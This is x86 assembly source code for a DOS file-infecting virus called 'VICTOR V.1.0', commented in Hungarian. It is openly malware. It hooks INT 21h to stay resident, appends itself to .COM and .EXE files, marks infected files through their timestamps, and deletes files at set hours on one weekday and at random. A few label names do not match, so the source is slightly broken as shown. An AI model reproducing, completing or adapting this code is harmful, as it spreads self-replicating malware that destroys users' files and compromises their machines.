;************************************************
;*                                              *
;*   VICTOR V.1.0                               *
;*   The incredible high performance virus      *
;*   Length #98A bytes                          *
;*                                              *
;************************************************
;
;        6 = bunteto sys file's time
;        8 = bunteto sys file's date
;       3f = Loaded .EXE header E... offset SS
;       41 =         value SP
;       43 =         chksum
;       45 =         value IP
;       47 =         offset CS
;       49 = SS init addr (relative to 0)
;       4B = SP init addr
;       4F = .EXE start point ofs (relative to 0)
;       51 = .EXE start point seg
;       53 = .exe size$ - header length
;       59 = .EXE file logikai merete /felkerekitve egy $ al, $ hatar/
;       5B =   --""--
;       5D = .exe size length mod 512
;       5F = .exe size length div 512
;       61 = Loaded .EXE header length $ mod 512
;       63 = PSP seg
;       65 = psp seg
;       72 = ido tarolohely hi=sec, lo=1/100 sec
;   B   74 = jelzo a bunteto rendszerben talalt file 1=COM,0=EXE
;       75 = a bunteto rendszerben a talalt file attributuma
;       77 = DOS fatal error ofs
;       79 = DOS fatal error seg
;       7B = DTA ofs
;       7D = DTA seg
;       7F = PSP seg
;   B   81 = A sajat file f9=.EXE/f8=.COM (default)
;       82 = INT_21 ofs
;       84 = INT_21 seg
;       86 = az FFFF funkciora dos-tol visszakapott ertek
;       88 = seg PSP:100 / PSP
;       8C = env-en beluli offset  sajat nev
;       8E = SS save area
;       90 = SP save area
;       92
;        |   Parameter Block for Load
;       9E
;   B   A2 = INT_21 second
;   B   A3 = INT_21 minute
;       A4 = INT_21 SS save
;       A6 = INT_21 SP save
;       A8 = flag 1=child process in action 0=foprocess
;       A9 = INT_21 original AX
;   B   B1 = idopont flag Pentek 9,11,13,15 idopontokban 1 /0
;   B   B2 = day of week (0=sun ... 6=sat)
;   B   BA = f8 (default .COM file) f9=exe
;
XSEG    SEGMENT
        ASSUME CS:XSEG
XPROC   PROC FAR
        CALL    L00B4           ;eloszor egy jmp x-el a virus indul el
        db      ?,?,?           ;a program elso 3 byte-ja
        db      ? dup (?)       ;adatterulet
L00B4:  POP     SI
        SUB     SI,3
        CLI
        CLD
        CLC
        JC      L00EB
        PUSH    SI
        ADD     SI,3
        CLD
        MOV     DI,100H         ;restauracio
        MOVSW
        MOVSB
        POP     SI
        MOV     AX,CS
        MOV     BX,AX
        MOV     CL,4
        SHR     SI,CL
        ADD     AX,SI           ;ax=virus kezdet szegmens
        PUSH    AX
        MOV     AX,0D8H
        PUSH    AX
        DB      0CBH            ;RETF
;cont...
        MOV     CS:[7FH],BX             ;eredeti PSP addr
        MOV     CS:[63H],BX
        MOV     AX,CS
        MOV     DS,AX
        MOV     ES,AX                   ;atteres a virus szegmensre
        JMP     L010A
;L00EB:
;        MOV     CS:[0063H],DS
;        MOV     AX,CS
;        MOV     DS,AX
;        MOV     ES,AX
;        MOV     AX,WORD PTR DS:[0063H]
;        ADD     AX,0010H
;        MOV     WORD PTR DS:[0065H],AX
;        MOV     SI,003FH
;        MOV     DI,0049H
;        MOV     CX,0005H
;        MOVSW
;

;
; A virus ellenorzi a DOS verziot, ha ez nem megfelelo _exec.
; Ha a virus meg nincs a memoriaban _copy0
; Ha mar bent van _exec
;
L010A:  MOV     AL,DS:[00BAH]
        MOV     DS:[0081H],AL
        MOV     AH,30H                  ;DOS version
        INT     21H
        CMP     AL,3
        JZ      vers_ok
        MOV     CX,0FEC1H
        MOV     DS:[0086H],CX
        JMP     _exec
vers_ok:MOV     AX,0FFFFH               ;Mar a memoriaban van ?
        MOV     BX,0FF0H
        INT     21H
        MOV     DS:[0086H],CX
        CMP     CX,0FEC1H
        JNZ     _copy0
        JMP     _exec
;
;  _copy0: a virus elhelyezese a memoriaban
;
; A virus meg nincs a memoriaban.
; Megkeresi a saja nevet a kesobbieknek es megnezi hogy sajat maga elerheto-e.
; A memoriablokkja elejere masolja a virust .COM, es .EXE file-oknak
; megfeleloen. Ezek utan _exec.
;
_copy0:
        PUSH    ES
        MOV     AX,DS:[063H]            ;A program ENV-je
        MOV     ES,AX
        MOV     AX,ES:[02CH]
        MOV     DS:[8AH],AX
        PUSH    DS
        MOV     AX,DS:[8AH]
        MOV     DS,AX
        MOV     ES,AX
        XOR     DI,DI
        MOV     AL,1
        MOV     CX,01F4H
        REPNE   SCASB
        INC     DI
        POP     DS
        POP     ES
        MOV     DS:[8CH],DI             ;Sajat fertozott programom neve
        PUSH    DS
        MOV     DX,DI
        MOV     AX,DS:[008AH]
        MOV     DS,AX
        MOV     AX,3D00H                ;Open File = Sajat magam
        INT     21H
        POP     DS
        JNC     L0175
        MOV     DS:[86H],0FEC1H
        JMP     _exec
L0175:  MOV     BX,AX                   ;Close File
        MOV     AH,3EH
        INT     21H
        CMP     BYTE PTR DS:[081H],0F9H
        JZ      exe_file                ;Az exe-t 0-ra kell masolni
        MOV     AX,DS:[007FH]
        MOV     DS:[0065],AX
        MOV     ES,AX
        ADD     AX,0010H
        MOV     WORD PTR DS:[0088H],AX  ;ES=PSP:100
        XOR     SI,SI
        MOV     DI,0100H                ;eddig a virus a mem vegen volt
        MOV     CX,098AH                ;Atmasolja a virust  PSP:100 ra
        REP     MOVSB
        PUSH    AX
        MOV     AX,01B7H
        PUSH    AX
        DB      0CBH                    ;A vezerles a PSP:100 ban!!! to:1
;
; .EXE program eseten nem kell lehet 100H ra tenni.
;
exe_file:
        MOV     AX,DS:[0065H]           ;normal psp:
        MOV     ES,AX
        MOV     DS:[0088H],AX
        XOR     SI,SI
        XOR     DI,DI
        MOV     CX,098AH                ;A virus szegmensbol a psp: re
        REP     MOVSB                   ; atmasolja a virust.
        PUSH    AX
        MOV     AX,01B7H
        PUSH    AX
        DB      0CBH; RETF
; cont from 1
;
;       _exec: blow/install/run_original
;
; 1. Esetleges kartekonykodas.
; 2. a, Ha a virus mar a memoriaban van, lefuttatja az
;       eredeti programot. /ez a tarban van, csupan a vezerlest kell raadni./
;    b, Ha meg nincs a memoriaban, akkor atveszi a rendszertol
;       a vezerlest. /ezutan barmilyen DOS fn-kerelmet ellenorizhet, vagy
;       tetszese szerint hatasaban megvaltoztathat./ Ennel a megvalositasnal
;       a virus felulirta a betoltott programot, hogy a memoriablokk tetejen
;       lehessen. Igy kenytelen a dos program betolto-lefuttato funkciojat
;       hasznalni, hogy lefuttassa a programot. A vezerlest visszakapva magat
;       rezidensse teszi magat, es kilep a DOS-ba /KEEP funkcio./
;
; /a hasznalata elott szukseges _copy0, ha meg nem rezidens a virus./
;
;
        MOV     AX,CS                   ;cs=psp:100
        MOV     DS,AX
        MOV     ES,AX
        MOV     SS,AX
        MOV     SP,08F3H
_exec:  MOV     AH,2CH                  ;Get Time
        INT     21H
        MOV     DS:[0072H],DX           ;seconds/hundredths
        MOV     AH,2CH
        INT     21H
        MOV     CL,DL
        AND     CL,0FH
        ROL     DS:[0072H],CL
        TEST    WORD PTR DS:[0072H],1   ;Veletlen esemeny
        JE      L01E2
        JMP     L01E5
L01E2:  CALL    _working                ;???? kartekonykodhat...
L01E5:  CMP     WORD PTR DS:[86H],0FEC1H;Meg nincs installalva de _copy0 volt
        JNZ     _inst
        JMP     run_prg                 ;a program tarban van, ugorj ra!
_inst:  MOV     DX,DS:[0088H]           ;seg(PSP:100) - PSP = 10
        SUB     DX,DS:[0065H]
        MOV     BX,098AH                ;Virus length in paragraphs
        MOV     CL,04H
        SHR     BX,CL
        INC     BX
        ADD     DX,BX
        ADD     DX,10H
        MOV     DS:[00A0H],DX
        PUSH    ES
        MOV     ES,DS:[0063H]           ;A sajat memoriablokkom merete csokken,
        MOV     BX,DS:[00A0H]           ; pont annyi lesz, ahova befer a virus
        MOV     AX,4A00H                ; PSP vel egyutt meg + $10
        INT     21H                     ;/mivel bemasoltuk, ez ott van/
        POP     ES
        PUSH    ES
        MOV     AX,3521H                ;Get INT_21 vector
        INT     21H
        MOV     DS:[0082H],BX
        MOV     DS:[0084H],ES
        POP     ES
        MOV     DX,06B3H                ;Set INT_21 vector
        MOV     AX,2521H
        INT     21H
        MOV     BYTE PTR DS:[00A8H],1   ;=child process flag
        PUSH    ES                      ;Prepare for Load/Exec self
        PUSH    DS
        MOV     DS:[008EH],SS
        MOV     DS:[0090H],SP
        MOV     AX,WORD PTR DS:[008AH]  ;Az L/E egy uj memoriablokkot hoz
        MOV     WORD PTR DS:[0092H],AX  ;letre /a virusprogram felett/
        MOV     AX,WORD PTR DS:[0063H]  ;exitnel csak az altala lefoglalt
        MOV     WORD PTR DS:[0096H],AX  ;blokk szabadul fel, a virus bent
        MOV     WORD PTR DS:[009AH],AX  ;marad tovabbra is.
        MOV     WORD PTR DS:[009EH],AX
        MOV     BX,0092H
        MOV     DX,DS:[008CH]
        MOV     AX,WORD PTR DS:[008AH]
        MOV     DS,AX
        MOV     AX,4B00H
        INT     21H
        MOV     AX,WORD PTR CS:[008EH]  ;A kilepeskor felszabadult a futtato
        MOV     SS,AX                   ;blokk, es visszakaptam a vezerlest.
        MOV     SP,CS:[0090H]
        POP     DS
        POP     ES
        MOV     BYTE PTR DS:[00A8H],0   ;Process flag
        MOV     DX,DS:[00A0H]
        MOV     AX,3100H                ;Terminate process and remain resident
        INT     21H                     ;(KEEP)
; Akkor hajtodik vegre, ha a virus mar bent van a memoriaban
run_prg:
        CMP     BYTE PTR CS:[81H],0F8H  ;.COM program
        JNZ     run_exe
        JMP     run_com
run_exe:MOV     DX,DS:[0065H]           ;PSP
        ADD     DS:[0051H],DX           ;Inditasi szegmens
        MOV     AX,WORD PTR DS:[0049H]  ;SS relative
        ADD     AX,DX                   ;Setup Stack
        MOV     SS,AX
        MOV     SP,DS:[004BH]
        MOV     AX,WORD PTR DS:[0063H]  ;Default PSP
        MOV     DS,AX
        MOV     ES,AX
        STI
        JMP     DWORD PTR CS:[004FH]    ;EXE Start point
; .COM program kornyezet beallitas, es lefuttatas PSP:100
run_com:MOV     AX,WORD PTR DS:[007FH]  ;Default PSP
        MOV     DS,AX
        MOV     ES,AX
        STI
        PUSH    AX
        MOV     AX,0100H
        PUSH    AX
        DB      0CBH; RETF
;
; Kartekony: letorol egy par file-t, vagy fertoz
;
_working:
        MOV     CX,DS:[0072H]           ;Veletlen kezdoertek 1..4 ciklus
        AND     CX,3
        INC     CX
delet:  PUSH    CX
        CALL    L02C5
        POP     CX
        LOOP    delet
        DB      0C3H; RET
;
L02C5:  MOV     AH,2AH                  ;Get Date
        INT     21H
        MOV     DS:[00B2H],AL           ;Day of Week
        PUSH    ES
        MOV     AH,2FH                  ;Get DTA
        INT     21H
        MOV     DS:[007BH],BX
        MOV     DS:[007DH],ES
        POP     ES
        MOV     DX,0014H                ;Set DTA
        MOV     AH,1AH
        INT     21H
        PUSH    ES
        MOV     AX,3524H                ;Get Dos Fatal Error vector
        INT     21H
        MOV     DS:[0077H],BX
        MOV     DS:[0079H],ES
        POP     ES
        MOV     DX,00B3H
        MOV     AX,2524H                ;Set Fatal Error to : IRET
        INT     21H
        MOV     CX,0FFE3H
        MOV     DX,000AH                ;Search for first :*.*
        MOV     AH,4EH
        INT     21H
        JNC     _kezd
        JMP     io_err                  ; reset DTA, fatal error, RET
_kezd:  MOV     AH,2CH                  ;Set randomizer
        INT     21H
        MOV     DS:[0072H],DX
        MOV     AH,2CH
        INT     21H
        MOV     CL,DL
        AND     CL,0FH
        ROL     DS:[0072H],CL
        MOV     AH,2CH                  ;Get Time
        INT     21H
        XOR     DS:[0072H],DX
        MOV     BYTE PTR DS:[00B1H],0   ;idopont-flag
        CMP     BYTE PTR DS:[00B2H],3   ;Milyen nap van?
        JNZ     no_date
        CMP     CH,9                    ;Pentek 9h,11h,13h,15h-nal
        JZ      kill                    ; kimeletlenul letorol fileokat
        CMP     CH,0BH
        JZ      kill                    ;maskor neha megnezi hogy com/exe-e.
        CMP     CH,0DH
        JZ      kill
        CMP     CH,0FH
        JNZ     no_date
kill:   MOV     BYTE PTR DS:[00B1H],1   ;A datum megfelelo
no_date:TEST    WORD PTR DS:[0072H],30H
        JNZ     _1
        JMP     d_next
_1:     CMP     BYTE PTR DS:[00B1H],1
        JNZ     look_run
        MOV     DX,0032H                ;Megfelel az idopont, es sajnos...
        MOV     CX,0020H
        MOV     AX,4301H
        INT     21H                     ;change file mode to normal
        JNB     _del
        JMP     io_err
_del:   MOV     DX,0032H                ;UNLINK file
        MOV     AH,41H
        INT     21H
        JMP     io_err
;
; Ha futtathato .COM v .EXE a talalt file akkor megfertozi ha meg nincs,
; egyebkent keres egy masik file-t. /1 lehetoseget ad/
;
look_run:
        MOV     DI,0032H                ;A penteki kritikus idon kivul
        XOR     AL,AL                   ;akar fertozhet is
        MOV     CX,003FH
        REPNE   SCASB
        SUB     DI,+04H
        MOV     BP,DI
        MOV     SI,DI
        MOV     CX,0003H                ;ez egy .COM volt ???
        MOV     DI,000EH
        REPE    CMPSB
        JZ      _dcom
        MOV     SI,BP
        MOV     CX,0003H                ;vagy egy .EXE ???
        MOV     DI,0011H
        CMPSB
        JZ      _dexe
        JMP     d_next                  ;nem futtathato file, ujat
_dcom:  MOV     BYTE PTR DS:[0074H],1
        JMP     _d
_dexe:  MOV     BYTE PTR DS:[0074H],0
_d:     MOV     DX,0032H                ;Get file attr
        MOV     AX,4300H
        INT     21H
        JNB     _2
        JMP     io_err
_2:     MOV     DS:[0075H],CX
        MOV     DX,0032H                ;Set normal attr
        MOV     CX,0020H
        MOV     AX,4301H
        INT     21H
        JNC     L03CD
        JMP     io_err
L03CD:  MOV     DX,0032H                ;Open file
        MOV     AX,3D02H
        INT     21H
        JNB     L03DA
        JMP     io_err
L03DA:  MOV     BX,AX
        MOV     AX,5700H                ;Get file date/time
        INT     21H                     ;a fertozott fileok ideje oszthato 8-al
        JNB     _3
        JMP     io_err
_3:     MOV     DS:[0006H],CX
        MOV     DS:[0008H],DX
        TEST    CX,0007H
        JZ      dft_ok
        JMP     fertoz                  ;ha nem oszthato 8-al, nincs fertozve
dft_ok: TEST    WORD PTR DS:[72H],43H   ;meg bizonytalankodik
        JZ      d_mehet
        JMP     d_clnxt
d_mehet:MOV     CX,0FFFFH               ;LSEEK  EOF - 6
        MOV     DX,0FFFAH
        MOV     AX,4202H
        INT     21H
        JNB     dls_ok
        JMP     io_err
dls_ok: MOV     CX,0006H                ;Read file's last 6 byte
        MOV     DX,00ABH
        MOV     AH,3FH
        INT     21H
        JNC     drd_ok
        JMP     io_err
drd_ok: MOV     CX,0003H                ;megegyezik valamivel
        MOV     SI,0984H                ;/mar fertozott/
        MOV     DI,00ABH
        REPE    CMPSW
        JZ      d_clnxt
        JMP     fertoz
d_clnxt:                                ;Close and Next
        MOV     AH,3EH
        INT     21H
        JNB     d_attrs
        JMP     io_err
dattrs: MOV     CX,DS:[0075H]           ;Reset attr
        MOV     DX,0032H
        MOV     AX,4301H
        INT     21H
        JNC     d_next
        JMP     io_err
;
; Probal ujabb file-t keresni
;
d_next: TEST    WORD PTR DS:[0072H],2CH         ;meg egy lehetosege van
        JNZ     _dsnext
        JMP     io_err
_dsnext:MOV     AH,4FH
        INT     21H
        JNC     _dnxtok
        JMP     io_err
_dnxtok:JMP     _kezd
;
; A fertozott file jellemzoi: /.COM v .EXE /
;
;   Csak olyan file-okat fertoz meg melyek hossza nagyobb a virusenal.
;   A tul nagy .COM fileokat nem bantja.
;   File ido oszthato 8-al
;   File vegen levo virus azonosito (6 byte ea80492502. )
;
fertoz: XOR     CX,CX
        XOR     DX,DX
        MOV     AX,4202H        ;LSEEK eof
        INT     21H
        JNC     _4
        JMP     io_err
_4:     AND     DX,DX
        JNZ     d_selct
        CMP     AX,098AH        ;csak a virusnal nagyobbak jok
        JNC     d_selct
        JMP     d_clnxt
d_selct:CMP     BYTE PTR DS:[0074H],1
        JNZ     df_exe
        JMP     df_com
;
; .EXE file megfertozese
;
; 1. Beolvassa a File hosszat mod 512 (+2) es a tobbi informaciot
; 2. A file vegere /size felkerekitett $, $ hatar/ felirja a virus-testet
; 3. Kiszamitja a kod hosszat = eredeti_file_size$ - header_size ,
;    es ez lesz erteke az uj +SS,+CS nek, IP=0.
;    /az eredeti exe kod moge, pont a virusra mutat/
; 4. Felirja az uj Header informaciot.
; 5. Megallapitja az uj filehossz div,mod 512-t
; 6. Felirja a headerbe (+2)
; 7. Visszaallitja a file-idot (div 8) es a file attributumot
;
df_exe:
        MOV     BYTE PTR CS:[BAH],0F9H  ;.EXE file
        XOR     CX,CX
        MOV     DX,0008H
        MOV     AX,4200H                ;LSEEK 8: Size of header $
        INT     21H
        JNB     _5
        JMP     io_err
_5:     MOV     CX,0002H                ;READ Size of header mod 512
        MOV     DX,0061H
        MOV     AH,3FH
        INT     21H
        JNC     _6
        JMP     io_err
_6:     XOR     CX,CX                   ;LSEEK E: Offset of SS
        MOV     DX,000EH
        MOV     AX,4200H
        INT     21H
        JNC     _7
        JMP     io_err
_7:     MOV     CX,000AH                ;Read header information
        MOV     DX,003FH
        MOV     AH,3FH
        INT     21H
        JNC     _8
        JMP     io_err
_8:     XOR     CX,CX
        XOR     DX,DX
        MOV     AX,4202H                ;LSEEK eof
        INT     21H
        JNB     _9
        JMP     io_err
_9:     MOV     CX,DX
        MOV     DX,AX                   ;a meret felkerekitve egy $-al
        ADD     DX,+10H                 ;mindig $ hatar
        ADC     CX,+00H
        AND     DX,-10H
        MOV     AX,4200H
        INT     21H                     ;Elmegy a file vegere /maga szerint/
        JNB     _10
        JMP     io_err
_10:    MOV     DS:[005BH],DX
        MOV     DS:[0059H],AX
        MOV     CX,098AH
        XOR     DX,DX                   ;Felirja a virus-testet
        MOV     AH,40H
        INT     21H
        JNB     L0501
        JMP     io_err
L0501:  CMP     AX,CX
        JE      L0508
        JMP     io_err
L0508:  MOV     DX,DS:[005BH]           ;size HI max. 000x  x=0..f hexad.
        MOV     CL,0CH
        SHL     DX,CL
        MOV     AX,DS:[0059H]           ;size LO
        MOV     CL,04H
        SHR     AX,CL
        OR      DX,AX
        SUB     DX,DS:[0061H]
        MOV     DS:[005BH],DX           ;size $ - header_length = code_length$
        MOV     DS:[0053H],DX
        MOV     WORD PTR DS:[0059H],0
        XOR     CX,CX
        MOV     DX,000EH                ;LSEEK E:
        MOV     AX,4200H
        INT     21H
        JNB     L053A
        JMP     io_err
L053A:  MOV     CX,000AH                ;WRITE UP new Header Info
        MOV     DX,0053H                ;
        MOV     AH,40H                  ; new SS ofs = file moge mutat
        INT     21H                     ; new IP = 0
        JNB     L0549                   ; new CS ofs = file moge mutat
        JMP     io_err
        NOP
L0549:  XOR     CX,CX                   ;LSEEK EOF
        XOR     DX,DX
        MOV     AX,4202H
        INT     21H
        JNB     L0557
        JMP     io_err
        NOP
L0557:  ADD     AX,01FFH                ;Totalsize = exesize + virus
        ADC     DX,0                    ;felkerekiti 512-re
        MOV     DH,DL
        MOV     DL,AH                   ;DX= DL AH
        XOR     AH,AH
        SHR     DX,1                    ; ez lesz a hanyados
        ADC     AH,0
        MOV     WORD PTR DS:[005DH],AX  ; 256/0 maradek
        MOV     DS:[005FH],DX
        XOR     CX,CX                   ;LSEEK 2: size mod 512
        MOV     DX,0002H
        MOV     AX,4200H
        INT     21H
        JNB     L057E
        JMP     io_err
        NOP
L057E:  MOV     CX,0004H                ;WRITE up  size mod 512
        MOV     DX,005DH                ;          size div 512
        MOV     AH,40H
        INT     21H
        JNB     L058D
        JMP     SHORT io_err
        NOP
L058D:  MOV     CX,DS:[0006H]           ;Set Original file time
        MOV     DX,DS:[0008H]           ;kiveve time oszthato 8-al
        AND     CX,-08H
        MOV     AX,5701H
        INT     21H
        JNB     L05A2
        JMP     SHORT io_err
        NOP
L05A2:  MOV     AH,3EH                  ;Close
        INT     21H
        JNB     L05AB
        JMP     SHORT io_err
        NOP
L05AB:  MOV     CX,DS:[0075H]           ;Reset attr
        MOV     DX,0032H
        MOV     AX,4301H
        INT     21H
        JMP     io_err
;
; I/O error
;
io_err: PUSH    DS
        MOV     DX,DS:[007BH]
        MOV     AX,DS:[007DH]
        MOV     DS,AX           ;Reset DTA
        MOV     AH,1AH
        INT     21H
        POP     DS
        PUSH    DS
        MOV     DX,DS:[0077H]
        MOV     AX,DS:[0079H]   ;Reset Fatal Error vector
        MOV     DS,AX
        MOV     AX,2524H
        INT     21H
        POP     DS
        DB      0C3H; RET
;
; A .COM file megfertozese:
;
; 1. Ellenorzi, hogy nem lesz-e tul nagy a .COM file a virussal egyutt.
; 2. Eltarolja adatteruletere a file elso 3 byte-jat /ezt fogja kicserelni/
; 3. A file vege utan /felkerekiti egy $-al,mindig $-hatar/ felirja a
;    virus-testet.
; 4. A file elejere felirja a JMP v_start utasitast. v_start = filesize + 3
; 5. Visszaallitja a file-idot azon modositassal, hogy mindig oszthato 8-al
;    /ez egy jel amirol gyorsabban ismerheti fel a mar fertozott prg-kat/,
;    es az eredeti file-attributumot.
;
df_com:
        MOV     BYTE PTR CS:[BAH],0F8H  ;.COM file
        XOR     DX,DX
        XOR     CX,CX
        MOV     AX,4202H                ;LSEEK EOF
        INT     21H
        JNB     _c1
        JMP     SHORT io_err
_c1:    MOV     CX,0FC80H               ;nem tul nagy-e a file (max 64K COM)
        SUB     CX,098AH
        CMP     AX,CX
        JB      _csoz
        JMP     d_clnxt
_csok:  XOR     DX,DX
        XOR     CX,CX
        MOV     AX,4200H                ;LSEEK START
        INT     21H
        JNB     _crd3
        JMP     SHORT io_err
_crd3:  MOV     CX,0003H                ;READ FILE'S FIRST 3 byte
        MOV     DX,0003H                ;(ezt fogja lecserelni az ugrasra)
        MOV     AH,3FH                  ;ds:3 ra azaz a virustestbe
        INT     21H
        JNB     _crdok
        JMP     SHORT io_err
_crdok: CMP     AX,CX
        JZ      _crdok1
        JMP     SHORT io_err
_crdok1:XOR     CX,CX                   ;LSEEK EOF
        XOR     DX,DX
        MOV     AX,4202H
        INT     21H
        JNC     _cls1ok
        JMP     io_err
_cls1ok:MOV     BP,AX                   ; (size + 10h) AND -10h =
        ADD     BP,+10H
        AND     BP,-10H                 ; felkerekiti egy $-al a size-t
        XOR     CX,CX
        MOV     DX,BP
        MOV     AX,4200H                ; es elmegy ide /over EOF/
        INT     21H
        JNB     _covr
        JMP     io_err
_covr:  MOV     CX,098AH                ;WRITE felirja a virustestet
        XOR     DX,DX
        MOV     AH,40H
        INT     21H
        JNB     _cwrok
        JMP     io_err
_cwrok: CMP     AX,CX
        JZ      _cwr1ok
        JMP     io_err
_cwrok1:XOR     DX,DX                   ;LSEEK START
        XOR     CX,CX
        MOV     AX,4200H
        INT     21H
        JNB     L0664
        JMP     io_err
L0664:  MOV     BYTE PTR DS:[0003H],0E9H
        SUB     BP,+03H                 ;WRITE jmp virus (size+3)
        MOV     DS:[0004H],BP
        MOV     CX,0003H
        MOV     DX,0003H
        MOV     AH,40H
        INT     21H
        JNB     L067F
        JMP     io_err
L067F:  CMP     AX,CX
        JE      L0686
        JMP     io_err
L0686:  MOV     CX,DS:[0006H]           ;Set file Date/Time
        MOV     DX,DS:[0008H]           ;A FERTOZOTT FILE IDEJE OSZTHATO 8-AL
        AND     CX,-08H                 ;CX = xxxxx000
        MOV     AX,5701H
        INT     21H
        JNB     L069B
        JMP     io_err
L069B:  MOV     AH,3EH                  ;Close file
        INT     21H
        JNB     L06A4
        JMP     io_err
L06A4:  MOV     CX,DS:[0075H]           ;Set original file attr
        MOV     DX,0032H
        MOV     AX,4301H
        INT     21H
        JMP     io_err                  ;befejezodott a fertozes

;*******************************
;*                             *
;* A rezidens INT_21 funkcio   *
;*                             *
;*******************************

        CMP     AX,0FFFFH               ;virus funkcio: install_stat
        JNE     L06C2
        CMP     BX,0FF0H
        JNE     L06C2
        MOV     CX,0FEC1H               ;visszaadja az install-kodot
        IRET
L06C2:  CMP     AH,3EH                  ;CLOSE
        JE      L0710
        CMP     AH,41H                  ;UNLINK
        JE      L0710
        CMP     AH,3CH                  ;CREAT
        JE      L0710
        CMP     AH,42H                  ;LSEEK
        JE      L0710
        CMP     AH,43H                  ;CHMOD
        JE      L0710
        CMP     AH,4BH                  ;L/E
        JE      L0710
        CMP     AH,4EH                  ;FFIRST
        JE      L0710
        CMP     AH,4FH                  ;FNEXT
        JE      L0710
        CMP     AH,5BH                  ;CREATE
        JE      L0710
        CMP     AH,39H                  ;MKDIR
        JE      L0710
        CMP     AH,3AH                  ;RMDIR
        JE      L0710
        CMP     AH,3BH                  ;CHDIR
        JE      L0710
        CMP     AH,3DH                  ;OPEN
        JE      L0710
        CMP     AH,3FH                  ;READ
        JE      L0710
        CMP     AH,40H                  ;WRITE except BX=1 stdout
        JE      L0710
        JMP     jmp_dos
L0710:
        CMP     BYTE PTR CS:[00A8H],1   ;Ha Child processben vagyunk
        JNE     L071B                   ;mindent beken kell hagyni...
        JMP     jmp_dos
L071B:  CMP     AH,40H                  ;FN = WRITE, handle=1 (print)
        JNE     L0728                   ;   nem bantja
        CMP     BX,+01H
        JNE     L0728
        JMP     jmp_dos                 ;to dos
L0728:
        MOV     CS:[00A9H],AX
        MOV     CS:[00A4H],SS
        MOV     CS:[00A6H],SP
        MOV     AX,CS
        MOV     SS,AX
        MOV     SP,08F3H
        PUSH    ES
        PUSH    DS
        PUSH    AX
        PUSH    BX
        PUSH    CX
        PUSH    DX
        PUSH    SI
        PUSH    DI
        PUSH    BP
        MOV     AX,CS
        MOV     DS,AX
        MOV     ES,AX
        PUSH    DS
        MOV     DX,DS:[0082H]
        MOV     AX,DS:[0084H]
        MOV     DS,AX
        MOV     AX,2521H                ;Visszaallitja az eredeti
        INT     21H                     ; DOS hivas lehetoseget
        POP     DS                      ;  a rutinon belul
        NOP
        NOP
        NOP
        NOP
        MOV     AH,2CH                  ;Randomize
        INT     21H
        MOV     DS:[0072H],DX
        MOV     AH,2CH
        INT     21H
        MOV     CL,DL
        AND     CL,0FH
        ROL     DS:[0072H],CL
        MOV     AH,2CH
        INT     21H
        XOR     DS:[0072H],DX
        MOV     AH,2CH
        INT     21H
        CMP     CL,DS:[00A3H]
        JZ      L0792
        MOV     DS:[00A3H],CL           ;min
        MOV     DS:[00A2H],DH           ;sec
        JMP     do_it
        NOP
L0792:  MOV     BL,DS:[00A2H]           ;felorankent kozbelep
        ADD     BL,30
        CMP     DH,BL
        JC      _vDOS
        MOV     DS:[00A2H],DH
do_it:  CALL    _working
vDOS:   MOV     DX,06B3H                ;visszaallitja onmagat DOS-nak
        MOV     AX,2521H
        INT     21H
        POP     BP
        POP     DI
        POP     SI
        POP     DX
        POP     CX
        POP     BX
        POP     AX
        POP     DS
        POP     ES
        MOV     AX,WORD PTR CS:[00A4H]
        MOV     SS,AX
        MOV     SP,CS:[00A6H]
        MOV     AX,WORD PTR CS:[00A9H]
jmp_dos
        JMP     DWORD PTR CS:[0082H]            ;Exec DOS fn

        db      'The incredible anyad'

XPROC   ENDP
XSEG    ENDS
        END
